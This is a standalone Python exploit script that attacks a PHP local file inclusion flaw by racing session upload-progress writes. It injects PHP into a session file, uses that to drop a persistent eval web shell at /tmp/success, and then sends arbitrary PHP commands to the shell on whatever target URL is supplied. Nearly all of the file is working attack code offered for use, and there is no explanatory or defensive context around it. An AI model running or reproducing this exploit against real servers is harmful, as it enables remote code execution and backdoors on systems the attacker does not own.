from email import header
import threading
from wsgiref import headers
import requests
from concurrent.futures import ThreadPoolExecutor, wait
import sys


# example python -u ".\session_lfi.exp.py" "http://test.com/lfi.php" "system('ls');"
target = ""
php_eval = "system(ls);"
try:
    target = sys.argv[1]
    php_eval = sys.argv[2]
except:
    print("use as exp.py url php_eval")

session = requests.session()
flag = 'helloworld'


def upload(e: threading.Event):
    files = [
        ('file', ('load.png', b'a' * 40960, 'image/png')),
    ]
    data = {'PHP_SESSION_UPLOAD_PROGRESS': rf'''<?php file_put_contents('/tmp/success', '<?=eval($_POST[1])?>'); echo('{flag}'); ?>'''}

    while not e.is_set():
        requests.post(
            target,
            data=data,
            files=files,
            cookies={'PHPSESSID': flag},
        )


def write(e: threading.Event):
    while not e.is_set():
        response = requests.get(
            f'{target}?file=/tmp/sess_{flag}',
        )

        if flag.encode() in response.content:
            e.set()


if __name__ == '__main__':
    futures = []
    event = threading.Event()
    pool = ThreadPoolExecutor(15)
    for i in range(10):
        futures.append(pool.submit(upload, event))

    for i in range(5):
        futures.append(pool.submit(write, event))

    wait(futures)

    headerr = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/98.0.1108.62",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
    }
    dataa = {
        "1":php_eval
    }
    r = requests.post(target+"?file=/tmp/success",data=dataa,headers=headerr)
    print(r.text)
    print(r.status_code)# why 502???? i can't understand !!!!